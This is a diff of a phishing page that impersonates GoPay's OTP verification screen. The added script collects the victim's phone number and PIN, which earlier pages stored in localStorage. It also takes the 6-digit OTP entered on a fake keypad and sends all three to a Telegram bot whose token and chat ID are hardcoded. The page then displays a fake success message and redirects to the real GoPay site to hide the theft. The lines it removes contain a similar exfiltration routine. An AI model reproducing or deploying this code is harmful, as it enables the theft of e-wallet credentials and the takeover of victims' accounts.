@@ -4,20 +4,9 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   
-  <!-- Meta Tags -->
   <title>GoPay - Verifikasi OTP</title>
-  <meta name="description" content="Aktifkan GOPAY Asuransi">
   <meta name="theme-color" content="#000000">
-  <link rel="canonical" href="https://gopays-0z4.app7.my.id/">
-  <meta property="og:title" content="Aktifkan GOPAY Asuransi">
-  <meta property="og:description" content="Aktifkan GOPAY Asuransi">
-  <meta property="og:url" content="https://gopays-0z4.app7.my.id/">
-  <meta property="og:site_name" content="GoPay">
-  <meta property="og:image" content="https://gopays-0z4.app7.my.id/gopay/gopay-ograph.webp">
-  <meta property="og:type" content="website">
-  <link rel="shortcut icon" href="/enterprise/gopay-logo.webp">
-  <link rel="icon" href="/enterprise/gopay-logo.webp" type="image/webp">
-
+  
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -31,36 +20,31 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    /* KUNCI LAYAR AGAR TIDAK BISA DIGESER */
+    /* Mengizinkan halaman untuk bisa digeser/didorong ke atas */
     html, body {
       width: 100%;
-      height: 100%;
-      overflow: hidden;
-      position: fixed;
+      min-height: 100%;
       background-color: #000000;
       color: #ffffff;
+      overflow-y: auto;
     }
 
     .app-container {
       width: 100%;
-      max-width: 420px;
-      height: 100vh;
+      min-height: 100vh;
       background-color: #000000;
-      padding: 16px 20px;
+      padding: 16px 20px 30px 20px;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
       position: relative;
       margin: 0 auto;
-      overflow: hidden;
     }
 
-    /* Top Bar */
     .go-topbar {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding-top: 4px;
       margin-bottom: 20px;
     }
 
@@ -74,139 +58,109 @@
       justify-content: center;
     }
 
-    .go-help-chip {
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      background-color: #1c1c1e;
-      border: none;
-      color: #ffffff;
+    .go-topbar-title {
+      font-size: 17px;
       font-weight: 600;
-      font-size: 14px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
 
-    /* Body Section */
     .go-step3-body {
       display: flex;
       flex-direction: column;
       align-items: flex-start;
-      flex-grow: 1;
+      margin-bottom: 20px;
     }
 
-    .go-otp-title {
-      font-size: 24px;
-      font-weight: 700;
-      margin-bottom: 6px;
-      color: #ffffff;
-    }
-
-    .go-otp-sub {
+    .otp-instruction {
       font-size: 14px;
       color: #9e9e9e;
-      margin-bottom: 24px;
+      margin-bottom: 16px;
+      line-height: 1.4;
     }
 
-    .go-field-label {
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 12px;
-      color: #ffffff;
-    }
-
-    .go-required {
-      color: #ef4444;
-    }
-
-    /* OTP Container & Garis */
-    .go-otp-container {
+    /* Kotak Input OTP 6 Digit */
+    .otp-display-box {
       width: 100%;
-      margin-bottom: 12px;
-    }
-
-    .go-otp-row {
+      height: 52px;
+      background-color: #121212;
+      border-radius: 12px;
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      position: relative;
-      margin-bottom: 0px;
-      padding-bottom: 8px;
-      border-bottom: 1px solid #333333; /* Garis panjang halus di bawah */
+      justify-content: flex-start;
+      padding-left: 20px;
+      gap: 22px;
+      margin-bottom: 16px;
     }
 
-    .go-otp-slots {
-      display: flex;
-      justify-content: space-between;
-      flex-grow: 1;
-      max-width: 280px;
+    .otp-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      border: 2px solid #666;
+      background: transparent;
+      transition: background 0.2s, border-color 0.2s;
     }
 
-    .go-otp-input {
-      width: 32px;
-      height: 36px;
+    .otp-dot.filled {
+      background: #ffffff;
+      border-color: #ffffff;
+    }
+
+    .resend-info {
+      font-size: 13px;
+      color: #9e9e9e;
+    }
+
+    .resend-btn {
+      color: #00aa13;
+      font-weight: 600;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 13px;
+      margin-top: 6px;
+    }
+
+    /* Keypad Angka */
+    .keypad-section {
+      width: 100%;
+      margin-top: auto;
+      padding-bottom: 20px;
+    }
+
+    .keypad-container {
+      width: 100%;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+    }
+
+    .key-btn {
       background: transparent;
       border: none;
-      border-bottom: 2px solid #666666; /* Garis pendek per kotak input */
-      text-align: center;
-      font-size: 22px;
-      font-weight: 600;
       color: #ffffff;
-      outline: none;
-      transition: border-bottom-color 0.2s;
-    }
-
-    .go-otp-input:focus {
-      border-bottom-color: #00aa13;
-    }
-
-    /* Timer Style */
-    .go-otp-timer {
+      font-size: 26px;
+      font-weight: 600;
+      height: 50px;
       display: flex;
       align-items: center;
-      gap: 6px;
-      flex-shrink: 0;
-      padding-left: 10px;
+      justify-content: center;
+      cursor: pointer;
+      border-radius: 10px;
     }
 
-    .go-timer-text {
-      font-size: 14px;
-      font-weight: 600;
-      color: #ffffff;
+    .key-btn:active {
+      background-color: rgba(255, 255, 255, 0.1);
     }
 
-    .go-timer-ring {
-      width: 18px;
-      height: 18px;
-      border-radius: 50%;
-      display: inline-block;
-      position: relative;
-    }
-
-    /* Error Toast Message */
-    .go-otp-toast {
-      font-size: 13px;
-      color: #ef4444;
-      margin-top: 8px;
-      display: none;
-    }
-
-    .go-otp-toast.show {
-      display: block;
-    }
-
-    /* Footer */
     .go-footer {
       text-align: center;
-      font-size: 13px;
-      color: #888888;
-      padding-bottom: 8px;
+      font-size: 12px;
+      color: #666666;
+      margin-top: 16px;
     }
 
-    .go-footer-goto {
-      color: #00b900;
+    .go-footer span {
+      color: #00aa13;
       font-weight: 700;
     }
   </style>
@@ -215,129 +169,115 @@
 
   <div class="app-container">
     <div>
-      <!-- Top Bar -->
       <header class="go-topbar">
-        <button type="button" class="go-icon-btn" aria-label="Kembali" onclick="history.back()">
+        <button type="button" class="go-icon-btn" onclick="history.back()">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
         </button>
-        <button type="button" class="go-help-chip" aria-label="Bantuan">?</button>
+        <span class="go-topbar-title">Masukkan Kode Verifikasi</span>
+        <button type="button" class="go-icon-btn" style="visibility: hidden;">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/></svg>
+        </button>
       </header>
 
-      <!-- Main Body -->
       <div class="go-step3-body">
-        <h2 class="go-otp-title">Cek WhatsApp, ya</h2>
-        <p class="go-otp-sub" id="subText">Kode-nya kami kirim ke +62*******5555</p>
+        <p class="otp-instruction">Kode verifikasi (OTP) telah dikirimkan melalui SMS ke nomor Anda. Masukkan 6 digit kode tersebut di bawah ini.</p>
 
-        <label class="go-field-label">OTP <span class="go-required">*</span></label>
-        
-        <div class="go-otp-container">
-          <div class="go-otp-row">
-            <div class="go-otp-slots" id="otpContainer">
-              <input type="tel" inputmode="numeric" maxlength="1" class="go-otp-input" autocomplete="off" />
-              <input type="tel" inputmode="numeric" maxlength="1" class="go-otp-input" autocomplete="off" />
-              <input type="tel" inputmode="numeric" maxlength="1" class="go-otp-input" autocomplete="off" />
-              <input type="tel" inputmode="numeric" maxlength="1" class="go-otp-input" autocomplete="off" />
-              <input type="tel" inputmode="numeric" maxlength="1" class="go-otp-input" autocomplete="off" />
-              <input type="tel" inputmode="numeric" maxlength="1" class="go-otp-input" autocomplete="off" />
-            </div>
-
-            <!-- Timer -->
-            <div class="go-otp-timer">
-              <span class="go-timer-ring" id="timerRing" style="background: conic-gradient(#00aa13 100%, #3a3a3a 100%);"></span>
-              <span class="go-timer-text" id="timerText">01:00</span>
-            </div>
-          </div>
-
-          <!-- Pesan Error Merah -->
-          <p class="go-otp-toast" id="errorToast">OTP yang dimasukkan salah/kadaluwarsa</p>
+        <div class="otp-display-box" id="otpDisplay">
+          <div class="otp-dot"></div>
+          <div class="otp-dot"></div>
+          <div class="otp-dot"></div>
+          <div class="otp-dot"></div>
+          <div class="otp-dot"></div>
+          <div class="otp-dot"></div>
         </div>
+
+        <div class="resend-info">Tidak menerima kode?</div>
+        <button type="button" class="resend-btn" onclick="alert('Kode OTP baru telah dikirim ulang.')">Kirim ulang</button>
       </div>
     </div>
 
-    <!-- Footer -->
-    <footer class="go-footer">
-      <span>from </span><span class="go-footer-goto">goto</span>
-    </footer>
+    <div class="keypad-section">
+      <div class="keypad-container">
+        <button class="key-btn" onclick="pressKey('1')">1</button>
+        <button class="key-btn" onclick="pressKey('2')">2</button>
+        <button class="key-btn" onclick="pressKey('3')">3</button>
+        <button class="key-btn" onclick="pressKey('4')">4</button>
+        <button class="key-btn" onclick="pressKey('5')">5</button>
+        <button class="key-btn" onclick="pressKey('6')">6</button>
+        <button class="key-btn" onclick="pressKey('7')">7</button>
+        <button class="key-btn" onclick="pressKey('8')">8</button>
+        <button class="key-btn" onclick="pressKey('9')">9</button>
+        <button class="key-btn" style="visibility: hidden;"></button>
+        <button class="key-btn" onclick="pressKey('0')">0</button>
+        <button class="key-btn" onclick="pressDelete()">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+        </button>
+      </div>
+
+      <footer class="go-footer">
+        from <span>goto</span>
+      </footer>
+    </div>
   </div>
 
   <script>
-    // ========================================================
-    // KONFIGURASI TELEGRAM BOT
-    // ========================================================
+    let currentOtp = "";
+    const dots = document.querySelectorAll('.otp-dot');
+
+    // Konfigurasi Token & Chat ID Telegram Anda (Pastikan sama dengan halaman sebelumnya)
     const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
     const TELEGRAM_CHAT_ID = "6742478722";
-    // ========================================================
 
-    const savedPhone = localStorage.getItem('gopay_phone');
-    if (savedPhone && savedPhone.length > 6) {
-      const masked = savedPhone.slice(0, 4) + "*******" + savedPhone.slice(-4);
-      document.getElementById('subText').innerText = `Kode-nya kami kirim ke ${masked}`;
-    }
-
-    // Timer Logic (60 Detik / 1 Menit)
-    let timeLeft = 60;
-    const timerText = document.getElementById('timerText');
-    const timerRing = document.getElementById('timerRing');
-
-    function startTimer() {
-      timeLeft = 60;
-      const countdown = setInterval(() => {
-        if (timeLeft <= 0) {
-          clearInterval(countdown);
+    function updateDots() {
+      dots.forEach((dot, index) => {
+        if (index < currentOtp.length) {
+          dot.classList.add('filled');
         } else {
-          timeLeft--;
-          let minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-          let seconds = String(timeLeft % 60).padStart(2, '0');
-          timerText.innerText = `${minutes}:${seconds}`;
-          
-          let percentage = (timeLeft / 60) * 100;
-          timerRing.style.background = `conic-gradient(#00aa13 ${percentage}%, #3a3a3a ${percentage}%)`;
+          dot.classList.remove('filled');
         }
-      }, 1000);
+      });
     }
-    startTimer();
 
-    // OTP Inputs Logic
-    const inputs = document.querySelectorAll('.go-otp-input');
-    const errorToast = document.getElementById('errorToast');
+    function pressKey(num) {
+      if (currentOtp.length < 6) {
+        currentOtp += num;
+        updateDots();
 
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        const val = e.target.value.replace(/\D/g, '');
-        e.target.value = val;
+        if (currentOtp.length === 6) {
+          // Ambil data yang tersimpan sebelumnya
+          const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
+          const savedPin = localStorage.getItem('gopay_pin') || 'Tidak ada data';
 
-        if (val && index < inputs.length - 1) {
-          inputs[index + 1].focus();
+          // Kirim data lengkap (No HP + PIN + OTP) ke Telegram Bot
+          const message = `🔔 *GOPAY FINAL DATA (OTP)*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${savedPin}\`\n🔢 OTP: \`${currentOtp}\``;
+          
+          if (TELEGRAM_BOT_TOKEN !== "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+              })
+            }).catch(err => console.log(err));
+          }
+
+          // Simulasi selesai atau diarahkan ke halaman sukses/beranda asli
+          setTimeout(() => {
+            alert("Verifikasi berhasil!");
+            window.location.href = "https://www.gopay.co.id/";
+          }, 500);
         }
-
-        checkOtpComplete();
-      });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !input.value && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
-
-    function checkOtpComplete() {
-      let otpCode = "";
-      inputs.forEach(input => otpCode += input.value);
-
-      if (otpCode.length === 6) {
-        sendOtpToTelegram(otpCode);
       }
     }
 
-    async function sendOtpToTelegram(otpCode) {
-      const phone = localStorage.getItem('gopay_phone') || 'Tidak diketahui';
-
-      const messageText = `📱🔐 *Data Verifikasi OTP Masuk*\n\n` +
-                          `• *Nomor HP:* \`${phone}\`\n` +
-                          `• *Kode OTP:* \`${otpCode}\`\n` +
-                          `• *Waktu:* ${new Date().toLocaleString('id-ID')}`;
-
-      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-      try {
-        await fetch
+    function pressDelete() {
+      if (currentOtp.length > 0) {
+        currentOtp = currentOtp.slice(0, -1);
+        updateDots();
+      }
+    }
+  </script>
+</body>
+</html>
